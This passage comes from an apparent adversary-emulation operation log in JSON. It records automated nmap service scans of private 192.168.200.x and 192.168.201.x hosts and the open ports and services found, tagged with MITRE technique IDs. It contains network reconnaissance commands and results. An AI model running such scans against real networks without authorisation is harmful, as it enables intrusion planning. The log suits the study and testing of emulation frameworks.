"source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.0/24", "unique": "host.subnet.ipaddrs192.168.201.0/24", "created": "2023-10-09T22:19:54Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.91'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.91', '192.168.201.3'])"]}, {"trait": "host.subnet.online_ipaddrs", "links": ["69651246-38d3-4785-9ca4-b8e1602794d1"], "collected_by": ["tovvyz"], "score": 1, "limit_count": -1, "name": "host.subnet.online_ipaddrs", "technique_id": "T1021.006", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["192.168.201.1", "192.168.201.2", "192.168.201.91", "192.168.201.3"], "unique": "host.subnet.online_ipaddrs['192.168.201.1', '192.168.201.2', '192.168.201.91', '192.168.201.3']", "created": "2023-10-09T22:24:41Z", "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.1', '192.168.201.2', '192.168.201.91', '192.168.201.3'])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:24:39Z"}, {"deadman": false, "finish": "2023-10-09T22:25:45Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "plaintext_command": "nmap -sV --version-light -oX - 192.168.200.3,4,5,6,7,156", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 13, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3,4,5,6,7,156", "unique": "scan.remote.addr192.168.200.3,4,5,6,7,156", "created": "2023-10-09T22:24:44Z", "relationships": []}], "unique": "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "decide": "2023-10-09T22:24:44Z", "status": 0, "score": 1, "pid": "2151", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a6470>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a7700>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a7c10>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a45e0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a5360>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a7a60>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a4e50>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a63e0>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a7070>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a2a7940>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a321cf0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a322860>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff670>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fe1a0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fccd0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fc3d0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fdff0>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fe5c0>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff460>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ff520>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fdf30>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fcf70>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:25:45Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:25:45Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ec790>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3ed360>", "score": 1}], "host": "database-host", "pin": 0, "paw": "tovvyz", "output": "True", "ability": {"tactic": "deception-data-collection", "ability_id": "deception-nmap", "executors": [{"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}], "privilege": null, "additional_info": {}, "delete_payload": true, "access": {}, "singleton": false, "repeatable": false, "technique_id": "T1021.004", "name": "Deception Nmap Host", "description": "Scans a host for open ports", "plugin": "deception", "requirements": [], "buckets": ["deception-data-collection"], "technique_name": "TODO"}, "agent_reported_time": "2023-10-09T22:24:49Z", "command": "nmap -sV --version-light -oX - 192.168.200.3,4,5,6,7,156", "facts": [{"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.3", "unique": "host.remote.ip192.168.200.3", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.201.3) : has_open_ports : host.remote.ports(['22', '4444'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.4", "unique": "host.remote.ip192.168.200.4", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22"], "unique": "host.remote.ports['22']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.5", "unique": "host.remote.ip192.168.200.5", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.5) : has_open_ports : host.remote.ports(['22', '4444'])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.6", "unique": "host.remote.ip192.168.200.6", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.6) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.7", "unique": "host.remote.ip192.168.200.7", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.7) : has_open_ports : host.remote.ports(['22'])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.ip", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.200.156", "unique": "host.remote.ip192.168.200.156", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}, {"trait": "host.remote.ports", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.156) : has_open_ports : host.remote.ports(['22', '8000'])", "host.remote.ip(192.168.201.91) : has_open_ports : host.remote.ports(['22', '8000'])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.200.5) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])", "host.remote.ip(192.168.201.3) : has_port_services : host.remote.port_services([('22', 'ssh'), ('4444', 'krb524')])"]}, {"trait": "host.remote.port_services", "links": ["6886aa43-7f5c-420a-8780-09ca6f83030a", "2a471089-0473-4d7b-9aa1-84e009b342b2", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c"], "collected_by": ["tubxdc", "rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh')]", "created": "2023-10-09T22:20:14Z", "relationships": ["host.remote.ip(192.168.200.4) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.6) : has_port_services : host.remote.port_services([('22', 'ssh')])", "host.remote.ip(192.168.200.7) : has_port_services : host.remote.port_services([('22', 'ssh')])"]}, {"trait": "host.remote.port_services", "links": ["2a471089-0473-4d7b-9aa1-84e009b342b2", "2b3de1b9-7a7c-45a7-9730-fdd10f68503a", "a5d2b5ae-8752-4e24-b2fc-03a5d412158c", "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd"], "collected_by": ["rkzyad", "tovvyz"], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": "T1021.004", "origin_type": "LEARNED", "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:23:04Z", "relationships": ["host.remote.ip(192.168.200.156) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])", "host.remote.ip(192.168.201.91) : has_port_services : host.remote.port_services([('22', 'ssh'), ('8000', 'ssh')])"]}], "visibility": {"adjustments": [], "score": 50}, "collect": "2023-10-09T22:24:49Z"}, {"deadman": false, "finish": "2023-10-09T22:26:05Z", "executor": {"additional_info": {}, "timeout": 60, "variations": [], "payloads": [], "code": null, "build_target": null, "name": "sh", "cleanup": [], "command": "nmap -sV --version-light -oX - #{scan.remote.addr}", "platform": "linux", "parsers": [{"module": "plugins.deception.app.parsers.nmap", "parserconfigs": [{"custom_parser_vals": {}, "target": "host.remote.ports", "edge": "has_open_ports", "source": "host.remote.ip"}, {"custom_parser_vals": {}, "target": "host.remote.port_services", "edge": "has_port_services", "source": "host.remote.ip"}]}], "uploads": [], "language": null}, "cleanup": 0, "id": "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd", "plaintext_command": "nmap -sV --version-light -oX - 192.168.201.1,2,91,3", "used": [{"trait": "scan.remote.addr", "links": [], "collected_by": [], "score": 5, "limit_count": -1, "name": "scan.remote.addr", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.1,2,91,3", "unique": "scan.remote.addr192.168.201.1,2,91,3", "created": "2023-10-09T22:25:49Z", "relationships": []}], "unique": "b49ae41b-bf75-471a-b8d6-81ae2b9ce2dd", "decide": "2023-10-09T22:25:49Z", "status": 0, "score": 1, "pid": "2153", "relationships": [{"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "8000"], "unique": "host.remote.ports['22', '8000']", "created": "2023-10-09T22:26:05Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.remote.ip192.168.201.91", "created": "2023-10-09T22:26:05Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3469e0>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a346800>", "score": 1}, {"target": {"trait": "host.remote.ports", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ports", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": ["22", "4444"], "unique": "host.remote.ports['22', '4444']", "created": "2023-10-09T22:26:05Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.3", "unique": "host.remote.ip192.168.201.3", "created": "2023-10-09T22:26:05Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_open_ports", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a347310>has_open_ports<app.objects.secondclass.c_fact.Fact object at 0x7fe71a347850>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["8000", "ssh"]], "unique": "host.remote.port_services[('22', 'ssh'), ('8000', 'ssh')]", "created": "2023-10-09T22:26:05Z", "relationships": []}, "source": {"trait": "host.remote.ip", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.ip", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": "192.168.201.91", "unique": "host.remote.ip192.168.201.91", "created": "2023-10-09T22:26:05Z", "relationships": []}, "origin": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "edge": "has_port_services", "unique": "<app.objects.secondclass.c_fact.Fact object at 0x7fe71a345630>has_port_services<app.objects.secondclass.c_fact.Fact object at 0x7fe71a3fcb20>", "score": 1}, {"target": {"trait": "host.remote.port_services", "links": [], "collected_by": [], "score": 1, "limit_count": -1, "name": "host.remote.port_services", "technique_id": null, "origin_type": null, "source": "a8c3c1a6-feeb-4ae8-8ab6-b73cd87dadf3", "value": [["22", "ssh"], ["4444", "krb524"]], "unique": "host.remote.port_services[('22', 'ssh'), ('4444', 'krb524')]", "created": "2023-10-09T22:26:05Z", "relationships": []}, "source": {"trait": "host.remote.ip", 